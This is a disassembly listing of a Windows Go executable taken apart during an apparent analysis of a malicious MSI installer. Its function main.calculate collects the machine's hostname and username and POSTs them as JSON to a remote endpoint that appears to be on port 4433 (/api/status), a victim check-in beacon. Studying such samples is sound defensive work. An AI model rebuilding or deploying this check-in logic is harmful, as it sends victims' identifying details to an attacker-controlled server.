
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

00000001402766e0 <.text+0x2756e0>:
   1402766e0 <main.calculate>:	4c 8d a4 24 00 ff ff 	lea    r12,[rsp-0x100]
   1402766e7:	ff 
   1402766e8:	4d 3b 66 10          	cmp    r12,QWORD PTR [r14+0x10]
   1402766ec:	0f 86 b3 06 00 00    	jbe    0x140276da5
   1402766f2:	55                   	push   rbp
   1402766f3:	48 89 e5             	mov    rbp,rsp
   1402766f6:	48 81 ec 78 01 00 00 	sub    rsp,0x178
   1402766fd:	48 89 84 24 88 01 00 	mov    QWORD PTR [rsp+0x188],rax
   140276704:	00 
   140276705:	48 89 8c 24 98 01 00 	mov    QWORD PTR [rsp+0x198],rcx
   14027670c:	00 
   14027670d:	48 89 9c 24 90 01 00 	mov    QWORD PTR [rsp+0x190],rbx
   140276714:	00 
   140276715:	48 c7 44 24 40 00 00 	mov    QWORD PTR [rsp+0x40],0x0
   14027671c:	00 00 
   14027671e:	44 0f 11 bc 24 d0 00 	movups XMMWORD PTR [rsp+0xd0],xmm15
   140276725:	00 00 
   140276727:	90                   	nop
   140276728:	e8 f3 71 e6 ff       	call   0x1400dd920 <os.hostname>
   14027672d:	48 85 c9             	test   rcx,rcx
   140276730:	0f 85 6d 04 00 00    	jne    0x140276ba3
   140276736:	48 89 5c 24 48       	mov    QWORD PTR [rsp+0x48],rbx
   14027673b:	48 89 84 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rax
   140276742:	00 
   140276743:	48 8d 05 14 ef 0e 00 	lea    rax,[rip+0xeef14]        # 0x14036565e 'USERNAMEipconfig\nERROR: https://omitzeronetedns0[::1]:53continue_gatewayshutdownwsaioctlinvalid addr'
   14027674a:	bb 08 00 00 00       	mov    ebx,0x8
   14027674f:	e8 ec 1f e6 ff       	call   0x1400d8740 <os.Getenv>
   140276754:	48 85 db             	test   rbx,rbx
   140276757:	75 11                	jne    0x14027676a
   140276759:	48 8d 05 98 e4 0e 00 	lea    rax,[rip+0xee498]        # 0x140364bf8 "USERPOST/allnullbooltruejson'\\''icmpigmpftpshttppop3smtp) = dialbindfile \r\t\nread on pipeunix.com.exe"
   140276760:	bb 04 00 00 00       	mov    ebx,0x4
   140276765:	e8 d6 1f e6 ff       	call   0x1400d8740 <os.Getenv>
   14027676a:	48 8b 8c 24 e8 00 00 	mov    rcx,QWORD PTR [rsp+0xe8]
   140276771:	00 
   140276772:	48 89 8c 24 40 01 00 	mov    QWORD PTR [rsp+0x140],rcx
   140276779:	00 
   14027677a:	48 8b 4c 24 48       	mov    rcx,QWORD PTR [rsp+0x48]
   14027677f:	48 89 8c 24 48 01 00 	mov    QWORD PTR [rsp+0x148],rcx
   140276786:	00 
   140276787:	48 89 84 24 50 01 00 	mov    QWORD PTR [rsp+0x150],rax
   14027678e:	00 
   14027678f:	48 89 9c 24 58 01 00 	mov    QWORD PTR [rsp+0x158],rbx
   140276796:	00 
   140276797:	48 8d 05 02 e9 0a 00 	lea    rax,[rip+0xae902]        # 0x1403250a0 ' \x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xcb\\xea\\x91c\x07\x08\x08\x19H\x14-@\x01\x00\x00\x00P >@\x01\x00\x00\x00\\xc3R\x00\x00\x00\\x97\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Q2@\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\\xae\x05\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00{\x1a.@'
   14027679e:	48 8d 9c 24 40 01 00 	lea    rbx,[rsp+0x140]
   1402767a5:	00 
   1402767a6:	e8 95 bf d9 ff       	call   0x140012740 <runtime.convT>
   1402767ab:	48 89 c3             	mov    rbx,rax
   1402767ae:	48 8d 05 eb e8 0a 00 	lea    rax,[rip+0xae8eb]        # 0x1403250a0 ' \x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\\xcb\\xea\\x91c\x07\x08\x08\x19H\x14-@\x01\x00\x00\x00P >@\x01\x00\x00\x00\\xc3R\x00\x00\x00\\x97\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00Q2@\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\\xae\x05\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00{\x1a.@'
   1402767b5:	e8 06 48 e8 ff       	call   0x1400fafc0 <encoding/json.Marshal>
   1402767ba:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
   1402767c0:	48 85 ff             	test   rdi,rdi
   1402767c3:	0f 85 9d 03 00 00    	jne    0x140276b66
   1402767c9:	48 89 4c 24 58       	mov    QWORD PTR [rsp+0x58],rcx
   1402767ce:	48 89 5c 24 50       	mov    QWORD PTR [rsp+0x50],rbx
   1402767d3:	48 89 84 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rax
   1402767da:	00 
   1402767db:	48 8d 05 ae 1c 17 00 	lea    rax,[rip+0x171cae]        # 0x1403e8490 '`\\xa11@\x01\x00\x00\x00\\xa0\\xdb3@\x01\x00\x00\x00[}\\xff\\x87\x00\x00\x00\x00\\xa0\\xc5\n@\x01\x00\x00\x00\x00\\xc6\n@\x01\x00\x00\x00@\\xc6\n@\x01\x00\x00\x00\\xe0\\xc6\n@\x01\x00\x00\x00`\\xa11@\x01\x00\x00\x00`\\xbb2@\x01\x00\x00\x00[ϠC\x00\x00\x00\x00`\\xd3\n@\x01\x00\x00\x00\\x80\\xd4\n@\x01\x00\x00\x00\\xa0\\xd5\n@'
   1402767e2:	48 8d 1d 37 11 3e 00 	lea    rbx,[rip+0x3e1137]        # 0x140657920 ''
   1402767e9:	48 b9 00 e4 0b 54 02 	movabs rcx,0x2540be400
   1402767f0:	00 00 00 
   1402767f3:	e8 48 53 e3 ff       	call   0x1400abb40 <context.WithTimeout>
   1402767f8:	48 89 44 24 60       	mov    QWORD PTR [rsp+0x60],rax
   1402767fd:	48 89 9c 24 00 01 00 	mov    QWORD PTR [rsp+0x100],rbx
   140276804:	00 
   140276805:	48 89 8c 24 b0 00 00 	mov    QWORD PTR [rsp+0xb0],rcx
   14027680c:	00 
   14027680d:	48 8d 84 24 98 00 00 	lea    rax,[rsp+0x98]
   140276814:	00 
   140276815:	e8 86 6d dc ff       	call   0x14003d5a0 <runtime.deferprocStack>
   14027681a:	90                   	nop
   14027681b:	48 8d 05 de a5 0b 00 	lea    rax,[rip+0xba5de]        # 0x140330e00 '(\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xe3\\x8cb|\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00\\xab\\x8c\x00\x00\\x80s\x07\x00\x10\r-@\x01\x00\x00\x00`\x0e3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x10\r\x00\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x00&\x00-@'
   140276822:	e8 d9 fb d9 ff       	call   0x140016400 <runtime.newobject>
   140276827:	48 8b 4c 24 50       	mov    rcx,QWORD PTR [rsp+0x50]
   14027682c:	48 89 48 08          	mov    QWORD PTR [rax+0x8],rcx
   140276830:	48 8b 4c 24 58       	mov    rcx,QWORD PTR [rsp+0x58]
   140276835:	48 89 48 10          	mov    QWORD PTR [rax+0x10],rcx
   140276839:	83 3d 80 15 3e 00 00 	cmp    DWORD PTR [rip+0x3e1580],0x0        # 0x140657dc0 ''
   140276840:	75 0a                	jne    0x14027684c
   140276842:	48 8b 94 24 f0 00 00 	mov    rdx,QWORD PTR [rsp+0xf0]
   140276849:	00 
   14027684a:	eb 10                	jmp    0x14027685c
   14027684c:	e8 cf 3f e0 ff       	call   0x14007a820 <runtime.gcWriteBarrier1>
   140276851:	48 8b 94 24 f0 00 00 	mov    rdx,QWORD PTR [rsp+0xf0]
   140276858:	00 
   140276859:	49 89 13             	mov    QWORD PTR [r11],rdx
   14027685c:	48 89 10             	mov    QWORD PTR [rax],rdx
   14027685f:	48 c7 40 18 00 00 00 	mov    QWORD PTR [rax+0x18],0x0
   140276866:	00 
   140276867:	48 c7 40 20 ff ff ff 	mov    QWORD PTR [rax+0x20],0xffffffffffffffff
   14027686e:	ff 
   14027686f:	48 8b 9c 24 00 01 00 	mov    rbx,QWORD PTR [rsp+0x100]
   140276876:	00 
   140276877:	48 8d 0d 7e e3 0e 00 	lea    rcx,[rip+0xee37e]        # 0x140364bfc "POST/allnullbooltruejson'\\''icmpigmpftpshttppop3smtp) = dialbindfile \r\t\nread on pipeunix.com.exe.bat"
   14027687e:	bf 04 00 00 00       	mov    edi,0x4
   140276883:	48 8b b4 24 90 01 00 	mov    rsi,QWORD PTR [rsp+0x190]
   14027688a:	00 
   14027688b:	4c 8b 84 24 98 01 00 	mov    r8,QWORD PTR [rsp+0x198]
   140276892:	00 
   140276893:	4c 8d 0d 66 f3 16 00 	lea    r9,[rip+0x16f366]        # 0x1403e5c00 '\\xc0\\xb30@\x01\x00\x00\x00\\x80s4@\x01\x00\x00\x00\\x8c=\\xb1f\x00\x00\x00\x00\\xe0D\x0f@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00@i5@\x01\x00\x00\x00<\x10\x1b.\x00\x00\x00\x00\\x80\x15\x0f@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00 @0@\x01\x00\x00\x00\\xa0\\xd23\\x8f\x00\x00\x00\x00\\xe0,\x08@\x01\x00\x00\x00@\\xb30@'
   14027689a:	49 89 c2             	mov    r10,rax
   14027689d:	48 8b 44 24 60       	mov    rax,QWORD PTR [rsp+0x60]
   1402768a2:	e8 b9 5d fc ff       	call   0x14023c660 <net/http.NewRequestWithContext>
   1402768a7:	48 85 db             	test   rbx,rbx
   1402768aa:	0f 85 54 02 00 00    	jne    0x140276b04
   1402768b0:	48 89 84 24 10 01 00 	mov    QWORD PTR [rsp+0x110],rax
   1402768b7:	00 
   1402768b8:	48 8b 48 38          	mov    rcx,QWORD PTR [rax+0x38]
   1402768bc:	48 89 8c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rcx
   1402768c3:	00 
   1402768c4:	90                   	nop
   1402768c5:	48 8d 05 6b 01 0f 00 	lea    rax,[rip+0xf016b]        # 0x140366a37 'Content-Typeempty domainunknown ATYPcheck error:short buffermultipathtcp127.0.0.1:53no such hostunkn'
   1402768cc:	bb 0c 00 00 00       	mov    ebx,0xc
   1402768d1:	e8 2a e3 f7 ff       	call   0x1401f4c00 <net/textproto.CanonicalMIMEHeaderKey>
   1402768d6:	48 89 84 24 68 01 00 	mov    QWORD PTR [rsp+0x168],rax
   1402768dd:	00 
   1402768de:	48 89 9c 24 c8 00 00 	mov    QWORD PTR [rsp+0xc8],rbx
   1402768e5:	00 
   1402768e6:	48 8d 05 f3 24 08 00 	lea    rax,[rip+0x824f3]        # 0x1402f8de0 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x1f\\x94\\x9c.\x02\x08\x08\x11\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\\xffR\x00\x00\x00\x00\x00\x00\\x80R/@\x01\x00\x00\x00 !/@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
   1402768ed:	e8 0e fb d9 ff       	call   0x140016400 <runtime.newobject>
   1402768f2:	48 89 84 24 60 01 00 	mov    QWORD PTR [rsp+0x160],rax
   1402768f9:	00 
   1402768fa:	48 c7 40 08 10 00 00 	mov    QWORD PTR [rax+0x8],0x10
   140276901:	00 
   140276902:	48 8d 0d 05 1a 0f 00 	lea    rcx,[rip+0xf1a05]        # 0x14036830e 'application/json:4433/api/statuscontext canceled0123456789abcdefafter object keyhostLookupOrder=/etc'
   140276909:	48 89 08             	mov    QWORD PTR [rax],rcx
   14027690c:	48 8d 05 8d 95 0c 00 	lea    rax,[rip+0xc958d]        # 0x14033fea0 '\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00{\\xeeo{\x07\x08\x085\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00(\x08\x01\x00`\\xd4\x05\x00\\x80R/@\x01\x00\x00\x00 !/@\x01\x00\x00\x00\\xe0\\xbd1@\x01\x00\x00\x00\\x90I8@\x01\x00\x00\x00H\x01\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00'
   140276913:	48 8b 9c 24 f8 00 00 	mov    rbx,QWORD PTR [rsp+0xf8]
   14027691a:	00 
   14027691b:	48 8b 8c 24 68 01 00 	mov    rcx,QWORD PTR [rsp+0x168]
   140276922:	00 
   140276923:	48 8b bc 24 c8 00 00 	mov    rdi,QWORD PTR [rsp+0xc8]
   14027692a:	00 
   14027692b:	e8 70 26 d9 ff       	call   0x140008fa0 <runtime.mapassign_faststr>
   140276930:	48 c7 40 08 01 00 00 	mov    QWORD PTR [rax+0x8],0x1
   140276937:	00 
   140276938:	48 c7 40 10 01 00 00 	mov    QWORD PTR [rax+0x10],0x1
   14027693f:	00 
   140276940:	83 3d 79 14 3e 00 00 	cmp    DWORD PTR [rip+0x3e1479],0x0        # 0x140657dc0 ''
   140276947:	75 0a                	jne    0x140276953
   140276949:	48 8b 94 24 60 01 00 	mov    rdx,QWORD PTR [rsp+0x160]
   140276950:	00 
   140276951:	eb 17                	jmp    0x14027696a
   140276953:	48 8b 08             	mov    rcx,QWORD PTR [rax]
   140276956:	e8 e5 3e e0 ff       	call   0x14007a840 <runtime.gcWriteBarrier2>
   14027695b:	48 8b 94 24 60 01 00 	mov    rdx,QWORD PTR [rsp+0x160]
   140276962:	00 
   140276963:	49 89 13             	mov    QWORD PTR [r11],rdx
   140276966:	49 89 4b 08          	mov    QWORD PTR [r11+0x8],rcx
   14027696a:	48 89 10             	mov    QWORD PTR [rax],rdx
   14027696d:	90                   	nop
   14027696e:	48 8b 84 24 88 01 00 	mov    rax,QWORD PTR [rsp+0x188]
   140276975:	00 
   140276976:	48 8b 9c 24 10 01 00 	mov    rbx,QWORD PTR [rsp+0x110]
   14027697d:	00 
   14027697e:	66 90                	xchg   ax,ax
   140276980:	e8 fb 66 fa ff       	call   0x14021d080 <net/http.(*Client).do>
   140276985:	48 85 db             	test   rbx,rbx
   140276988:	0f 85 3a 01 00 00    	jne    0x140276ac8
   14027698e:	48 89 84 24 08 01 00 	mov    QWORD PTR [rsp+0x108],rax
   140276995:	00 
   140276996:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
   14027699a:	84 01                	test   BYTE PTR [rcx],al
   14027699c:	48 8b 50 48          	mov    rdx,QWORD PTR [rax+0x48]
   1402769a0:	48 8d 1d 39 04 00 00 	lea    rbx,[rip+0x439]        # 0x140276de0 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec\x08M\\x8bf M\\x85\\xe4u\x1bH\\x8bJ\x08H\\x8bB\x10H\\x8bI\x18\\xff\\xd1H\\x83\\xc4\x08]\\xc3\\xe8p\x1a\\xe0\\xff\\xeb\\xceL\\x8dl$\x18M9,$u\\xdaI\\x89$$\\xeb\\xd4\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccL\\x8d\\xa4$' <main.calculate.deferwrap1>
   1402769a7:	48 89 9c 24 18 01 00 	mov    QWORD PTR [rsp+0x118],rbx
   1402769ae:	00 
   1402769af:	48 89 8c 24 20 01 00 	mov    QWORD PTR [rsp+0x120],rcx
   1402769b6:	00 
   1402769b7:	48 89 94 24 28 01 00 	mov    QWORD PTR [rsp+0x128],rdx
   1402769be:	00 
   1402769bf:	48 8d 8c 24 18 01 00 	lea    rcx,[rsp+0x118]
   1402769c6:	00 
   1402769c7:	48 89 8c 24 80 00 00 	mov    QWORD PTR [rsp+0x80],rcx
   1402769ce:	00 
   1402769cf:	48 8d 44 24 68       	lea    rax,[rsp+0x68]
   1402769d4:	e8 c7 6b dc ff       	call   0x14003d5a0 <runtime.deferprocStack>
   1402769d9:	48 8b 8c 24 08 01 00 	mov    rcx,QWORD PTR [rsp+0x108]
   1402769e0:	00 
   1402769e1:	48 81 79 10 c8 00 00 	cmp    QWORD PTR [rcx+0x10],0xc8
   1402769e8:	00 
   1402769e9:	75 54                	jne    0x140276a3f
   1402769eb:	48 8d 05 ee e4 09 00 	lea    rax,[rip+0x9e4ee]        # 0x140314ee0 '\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00F#\\xe3t\x0f\x08\x08\x19\\x80I8@\x01\x00\x00\x00\\xe82>@\x01\x00\x00\x00\\xb0\\xad\x00\x00\\x80\\x97\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00@O1@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\\xae\x05\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00Y\\xf2-@'
   1402769f2:	e8 09 fa d9 ff       	call   0x140016400 <runtime.newobject>
   1402769f7:	48 89 84 24 70 01 00 	mov    QWORD PTR [rsp+0x170],rax
   1402769fe:	00 
   1402769ff:	48 8b 8c 24 08 01 00 	mov    rcx,QWORD PTR [rsp+0x108]
   140276a06:	00 
   140276a07:	48 8b 51 40          	mov    rdx,QWORD PTR [rcx+0x40]
   140276a0b:	48 8b 49 48          	mov    rcx,QWORD PTR [rcx+0x48]
   140276a0f:	48 89 8c 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rcx
   140276a16:	00 
   140276a17:	66 0f 1f 84 00 00 00 	nop    WORD PTR [rax+rax*1+0x0]
   140276a1e:	00 00 
   140276a20:	48 85 d2             	test   rdx,rdx
   140276a23:	0f 84 ba 01 00 00    	je     0x140276be3
   140276a29:	48 8b 5a 08          	mov    rbx,QWORD PTR [rdx+0x8]
   140276a2d:	48 8b 35 bc b1 38 00 	mov    rsi,QWORD PTR [rip+0x38b1bc]        # 0x140601bf0 '\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140276a34:	48 8b 3e             	mov    rdi,QWORD PTR [rsi]
   140276a37:	8b 52 10             	mov    edx,DWORD PTR [rdx+0x10]
   140276a3a:	e9 24 03 00 00       	jmp    0x140276d63
   140276a3f:	44 0f 11 bc 24 30 01 	movups XMMWORD PTR [rsp+0x130],xmm15
   140276a46:	00 00 
   140276a48:	48 8b 01             	mov    rax,QWORD PTR [rcx]
   140276a4b:	48 8b 59 08          	mov    rbx,QWORD PTR [rcx+0x8]
   140276a4f:	e8 ec 9a df ff       	call   0x140070540 <runtime.convTstring>
   140276a54:	48 8d 0d 25 e8 07 00 	lea    rcx,[rip+0x7e825]        # 0x1402f5280 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb82\\x87\\xf8\x07\x08\x08\x18\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\x03-\x00\x00@\\xbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x15%\\xbc\x0f\x01\x01\x03\\xb0I8@\x01\x00\x00\x00\\xe82>@'
   140276a5b:	48 89 8c 24 30 01 00 	mov    QWORD PTR [rsp+0x130],rcx
   140276a62:	00 
   140276a63:	48 89 84 24 38 01 00 	mov    QWORD PTR [rsp+0x138],rax
   140276a6a:	00 
   140276a6b:	48 8d 05 1d 41 0f 00 	lea    rax,[rip+0xf411d]        # 0x14036ab8f 'unexpected status: %skey is not comparableafter top-level valuein string escape codeunsupported oper'
   140276a72:	bb 15 00 00 00       	mov    ebx,0x15
   140276a77:	48 8d 8c 24 30 01 00 	lea    rcx,[rsp+0x130]
   140276a7e:	00 
   140276a7f:	bf 01 00 00 00       	mov    edi,0x1
   140276a84:	48 89 fe             	mov    rsi,rdi
   140276a87:	e8 34 97 e6 ff       	call   0x1400e01c0 <fmt.Errorf>
   140276a8c:	48 c7 44 24 40 00 00 	mov    QWORD PTR [rsp+0x40],0x0
   140276a93:	00 00 
   140276a95:	48 89 84 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rax
   140276a9c:	00 
   140276a9d:	48 89 9c 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rbx
   140276aa4:	00 
   140276aa5:	e8 36 70 dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276aaa:	48 8b 9c 24 d0 00 00 	mov    rbx,QWORD PTR [rsp+0xd0]
   140276ab1:	00 
   140276ab2:	48 8b 8c 24 d8 00 00 	mov    rcx,QWORD PTR [rsp+0xd8]
   140276ab9:	00 
   140276aba:	48 8b 44 24 40       	mov    rax,QWORD PTR [rsp+0x40]
   140276abf:	48 81 c4 78 01 00 00 	add    rsp,0x178
   140276ac6:	5d                   	pop    rbp
   140276ac7:	c3                   	ret
   140276ac8:	48 c7 44 24 40 00 00 	mov    QWORD PTR [rsp+0x40],0x0
   140276acf:	00 00 
   140276ad1:	48 89 9c 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rbx
   140276ad8:	00 
   140276ad9:	48 89 8c 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rcx
   140276ae0:	00 
   140276ae1:	e8 fa 6f dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276ae6:	48 8b 9c 24 d0 00 00 	mov    rbx,QWORD PTR [rsp+0xd0]
   140276aed:	00 
   140276aee:	48 8b 8c 24 d8 00 00 	mov    rcx,QWORD PTR [rsp+0xd8]
   140276af5:	00 
   140276af6:	48 8b 44 24 40       	mov    rax,QWORD PTR [rsp+0x40]
   140276afb:	48 81 c4 78 01 00 00 	add    rsp,0x178
   140276b02:	5d                   	pop    rbp
   140276b03:	c3                   	ret
   140276b04:	48 c7 44 24 40 00 00 	mov    QWORD PTR [rsp+0x40],0x0
   140276b0b:	00 00 
   140276b0d:	48 89 9c 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rbx
   140276b14:	00 
   140276b15:	48 89 8c 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rcx
   140276b1c:	00 
   140276b1d:	0f 1f 00             	nop    DWORD PTR [rax]
   140276b20:	e8 bb 6f dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276b25:	48 8b 9c 24 d0 00 00 	mov    rbx,QWORD PTR [rsp+0xd0]
   140276b2c:	00 
   140276b2d:	48 8b 8c 24 d8 00 00 	mov    rcx,QWORD PTR [rsp+0xd8]
   140276b34:	00 
   140276b35:	48 8b 44 24 40       	mov    rax,QWORD PTR [rsp+0x40]
   140276b3a:	48 81 c4 78 01 00 00 	add    rsp,0x178
   140276b41:	5d                   	pop    rbp
   140276b42:	c3                   	ret
   140276b43:	e8 98 6f dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276b48:	48 8b 9c 24 d0 00 00 	mov    rbx,QWORD PTR [rsp+0xd0]
   140276b4f:	00 
   140276b50:	48 8b 8c 24 d8 00 00 	mov    rcx,QWORD PTR [rsp+0xd8]
   140276b57:	00 
   140276b58:	48 8b 44 24 40       	mov    rax,QWORD PTR [rsp+0x40]
   140276b5d:	48 81 c4 78 01 00 00 	add    rsp,0x178
   140276b64:	5d                   	pop    rbp
   140276b65:	c3                   	ret
   140276b66:	48 c7 44 24 40 00 00 	mov    QWORD PTR [rsp+0x40],0x0
   140276b6d:	00 00 
   140276b6f:	48 89 bc 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rdi
   140276b76:	00 
   140276b77:	48 89 b4 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rsi
   140276b7e:	00 
   140276b7f:	90                   	nop
   140276b80:	e8 5b 6f dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276b85:	48 8b 9c 24 d0 00 00 	mov    rbx,QWORD PTR [rsp+0xd0]
   140276b8c:	00 
   140276b8d:	48 8b 8c 24 d8 00 00 	mov    rcx,QWORD PTR [rsp+0xd8]
   140276b94:	00 
   140276b95:	48 8b 44 24 40       	mov    rax,QWORD PTR [rsp+0x40]
   140276b9a:	48 81 c4 78 01 00 00 	add    rsp,0x178
   140276ba1:	5d                   	pop    rbp
   140276ba2:	c3                   	ret
   140276ba3:	48 c7 44 24 40 00 00 	mov    QWORD PTR [rsp+0x40],0x0
   140276baa:	00 00 
   140276bac:	48 89 8c 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rcx
   140276bb3:	00 
   140276bb4:	48 89 bc 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rdi
   140276bbb:	00 
   140276bbc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140276bc0:	e8 1b 6f dc ff       	call   0x14003dae0 <runtime.deferreturn>
   140276bc5:	48 8b 9c 24 d0 00 00 	mov    rbx,QWORD PTR [rsp+0xd0]
   140276bcc:	00 
   140276bcd:	48 8b 8c 24 d8 00 00 	mov    rcx,QWORD PTR [rsp+0xd8]
   140276bd4:	00 
   140276bd5:	48 8b 44 24 40       	mov    rax,QWORD PTR [rsp+0x40]
   140276bda:	48 81 c4 78 01 00 00 	add    rsp,0x178
   140276be1:	5d                   	pop    rbp
   140276be2:	c3                   	ret
   140276be3:	48 89 94 24 68 01 00 	mov    QWORD PTR [rsp+0x168],rdx
   140276bea:	00 
   140276beb:	48 8d 05 8e 56 0d 00 	lea    rax,[rip+0xd568e]        # 0x14034c280 '0\x01\x00\x00\x00\x00\x00\x00 \x01\x00\x00\x00\x00\x00\x00F\\xc4\\xc67\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\\xe8!>@\x01\x00\x00\x00E\\x89\x00\x00@\\xbc\x07\x00\\x91\\x88-@\x01\x00\x00\x00\\xe0\\xc24@\x01\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\\x91\\x88\x00\x00\x00\x00\x00\x00\\xe8\x00\x00\x00\x00\x00\x00\x00\x1a\x00-@'
   140276bf2:	e8 09 f8 d9 ff       	call   0x140016400 <runtime.newobject>
   140276bf7:	48 8b 8c 24 68 01 00 	mov    rcx,QWORD PTR [rsp+0x168]
   140276bfe:	00 
   140276bff:	48 89 08             	mov    QWORD PTR [rax],rcx
   140276c02:	83 3d b7 11 3e 00 00 	cmp    DWORD PTR [rip+0x3e11b7],0x0        # 0x140657dc0 ''
   140276c09:	75 0a                	jne    0x140276c15
   140276c0b:	48 8b 94 24 e0 00 00 	mov    rdx,QWORD PTR [rsp+0xe0]
   140276c12:	00 
   140276c13:	eb 10                	jmp    0x140276c25
   140276c15:	e8 06 3c e0 ff       	call   0x14007a820 <runtime.gcWriteBarrier1>
   140276c1a:	48 8b 94 24 e0 00 00 	mov    rdx,QWORD PTR [rsp+0xe0]
   140276c21:	00 
   140276c22:	49 89 13             	mov    QWORD PTR [r11],rdx
   140276c25:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
   140276c29:	48 8d 1d 50 2b 07 00 	lea    rbx,[rip+0x72b50]        # 0x1402e9780 '\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00 \\xbe,`\x08\x08\x086\\x80I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\\xb0\\xad\x00\x00\x00\x00\x00\x00\\xe0N1@\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xf3đU\x08\x08\x086\\x80I8@\x01\x00\x00\x00H >@'
   140276c30:	48 8b 8c 24 70 01 00 	mov    rcx,QWORD PTR [rsp+0x170]
   140276c37:	00 
   140276c38:	e8 c3 e1 e8 ff       	call   0x140104e00 <encoding/json.(*Decoder).Decode>
   140276c3d:	0f 1f 00             	nop    DWORD PTR [rax]
   140276c40:	48 85 c0             	test   rax,rax
   140276c43:	0f 85 da 00 00 00    	jne    0x140276d23
   140276c49:	48 8b 8c 24 70 01 00 	mov    rcx,QWORD PTR [rsp+0x170]
   140276c50:	00 
   140276c51:	48 8b 11             	mov    rdx,QWORD PTR [rcx]
   140276c54:	48 85 d2             	test   rdx,rdx
   140276c57:	0f 84 92 00 00 00    	je     0x140276cef
   140276c5d:	0f 1f 00             	nop    DWORD PTR [rax]
   140276c60:	48 83 fa 01          	cmp    rdx,0x1
   140276c64:	0f 84 85 00 00 00    	je     0x140276cef
   140276c6a:	44 0f 11 bc 24 30 01 	movups XMMWORD PTR [rsp+0x130],xmm15
   140276c71:	00 00 
